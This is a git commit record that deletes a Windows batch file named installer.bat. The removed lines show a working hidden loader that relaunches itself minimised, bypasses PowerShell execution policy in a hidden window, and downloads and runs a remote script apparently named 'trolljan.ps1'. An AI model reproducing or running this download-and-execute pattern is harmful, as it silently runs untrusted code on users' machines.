e47de4242b159874e0c23ea72f8c953f2a780cbb
Awagat Jung <113638953+jungawagat@users.noreply.github.com>
2023-04-17 01:44:45 +0545

    Delete installer.bat

--- installer.bat
+++
@@ -1,4 +0,0 @@
-@echo off
-if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
-powershell.exe -ExecutionPolicy bypass -WindowStyle Hidden -Command "while(-not(Test-Connection -ComputerName '8.8.8.8' -Count 1 -Quiet)){Start-Sleep -Seconds 5}iex((New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/jungawagat/trolljan/main/trolljan.ps1'))"
-exit
